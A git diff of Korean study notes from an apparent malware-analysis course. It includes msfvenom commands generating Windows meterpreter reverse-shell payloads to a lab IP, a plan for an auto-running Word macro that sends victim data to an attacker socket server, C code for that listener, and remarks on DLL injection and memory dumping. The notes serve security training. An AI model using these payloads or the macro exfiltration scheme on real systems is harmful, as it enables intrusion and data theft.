@@ -49,12 +49,9 @@ exploit
 커널에서
 ```
 msfvenom -l payloads
-(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
-c)
-(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
-apk)
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f
-exe > mytext.exe
+(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f c)
+(msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f apk)
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.100.244.20 lport=7070 -f exe > mytext.exe
 ```
 #### 공유폴더/파일전송
 이더넷 인터페이스 통신으로 전송
@@ -97,7 +94,7 @@ Process Monitior의 행위의 결과값 분석하는 법
 > Detail 부분 보면 Read Attribute, Open -> 결론적으로 dll을 읽었다!는 뜻 => Create File이 아니라 Read File로 이름 바꾸는게 정확  
 > => EDR, APT 솔루션 이미 있음  
  
-#### 결론(해야 할 것)
+### 결론(해야 할 것)
 - 행위분석 수집 로그 프로그램 개발 //프로세스 모니터 자체를 개발 해야함
 - 전처리 프로그램 개발(A ->1, NULL, 이상치) 
 - 데이터분석
@@ -109,12 +106,12 @@ process Explore에서 메모장 우클릭->properties
   - Thread 부분 켜놓고, 메모징 저장 누르면 이 과정 Thread 부분에 동적으로 추가됨    
       -> 윈도우는 동적으로 동작하기 때문에 내가 실행할 때 dll 임의로 추가할 수 있음 => DLL Injection   
   
-#### 악성코드 메일 공격 방식
+### 악성코드 메일 공격 방식
 > 메일 자동 전송 1:다 공격 가능
 > 수신확인 - 스크립트(html)
 > 파이썬 코드로 메일 전송 가능(mime)
 
-#### 워드 매크로(CDR?)
+### 워드 매크로(CDR?)
 passwordchecker procexp에서 full dump 후 strings로 분석   
 strings PasswordChecker.dmp > a.txt    
 비밀번호, 메세지 등 문자열로 저장되어 있음    
@@ -128,12 +125,18 @@ strings PasswordChecker.dmp > a.txt
 
 
 
-![day2_2](https://user-images.githubusercontent.com/50771111/88466051-756ab380-cf03-11ea-972a-a8c19b88ad2f.jpg)
 
+### 시나리오
+```
+공격자가 매크로를 만들고(통신기능 있어야함) 어떤 데이터를 가져온다.  
+공격자 통신 -> 자동메일(매크로) -> 피해자: 버튼 클릭을 하면(전제조건 필수) -> 공격자에게 데이터
+1. 서버가 대기 2. 매크로 안에 통신 프로그램 -> 개발해야함, **소켓 프로그램**
+```
 
-
-### 서버
-#### test123.c //server.c
+### 간단히 소켓 프로그램 만들기(서버)
+#### kali_x86
+> cd clang
+> vi server.c -> 여기서 코드 조합해서 소켓 만듦
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -150,21 +153,49 @@ int   main( void)
    int   server_socket;
    int   client_socket;
    int   client_addr_size;
+   
    struct sockaddr_in   server_addr;
    struct sockaddr_in   client_addr;
+   
    char   buff_rcv[BUFF_SIZE+5];
-  server_socket  = socket( PF_INET, SOCK_STREAM, 0); //소켓 만듦
+   
+   server_socket  = socket( PF_INET, SOCK_STREAM, 0); //소켓 만듦
    memset( &server_addr, 0, sizeof( server_addr));
    server_addr.sin_family     = AF_INET; //인터넷
    server_addr.sin_port       = htons(7070); //포트 7070 -> 서버
    server_addr.sin_addr.s_addr= htonl( INADDR_ANY); //0.0.0.0 누구나 연결할 수 있음
-bind( server_socket, (struct sockaddr*)&server_addr, sizeof( server_addr)); //위에서 세팅한 값 적용(bind)
-listen(server_socket, 5); //최대 5명까지 붙을 수 있음
-client_socket     = accept( server_socket, (struct sockaddr*)&client_addr, &client_addr_size); //accept : 기다리는 중
-      read ( client_socket, buff_rcv, BUFF_SIZE);
-      printf( "receive: %s\n", buff_rcv);
+   
+   bind( server_socket, (struct sockaddr*)&server_addr, sizeof( server_addr)); //위에서 세팅한 값 적용(bind)
+   listen(server_socket, 5); //최대 5명까지 붙을 수 있음
+   client_socket     = accept( server_socket, (struct sockaddr*)&client_addr, &client_addr_size); //accept : 기다리는 중
+   
+   read ( client_socket, buff_rcv, BUFF_SIZE);
+   printf( "receive: %s\n", buff_rcv);
  close( client_socket);
  close(server_socket);
 }
 ```
+> vi test123. c 파일 안에 Inc_server.c 내용 복붙
+> gcc -o test123 test123.c
+> ./test123
+=> 이러면 떠 있음!  
+확인
+> netstate -antp 
 
+### 매크로 만들기
+> word에서 매크로 클릭, 매크로위치 문서1로 설정 한 뒤 만들기
+> 여기에 클라이언트 로직을 만들어야 함!!
+**검증된 매크로.txt을 보면**
+> AutoOpen //자동 실행   
+> 매크로 코드 복붙하기, inet_addr("virtual box ip 넣기")
+> 공유 폴더에 문서 형식 매크로 사용 형식으로 저장
+
+#### kali_x86
+> 다시 서버 띄우기 위해 ./test123
+> 매크로 파일 다시 열어서 누르면 뭔가 돌아간 것을 화면에서 확인 가능
+
+
+### 아래는 정리 다시 해야 할 듯!!
+winword.exe
+
+cmd에서 strings test.dmp >a.txt
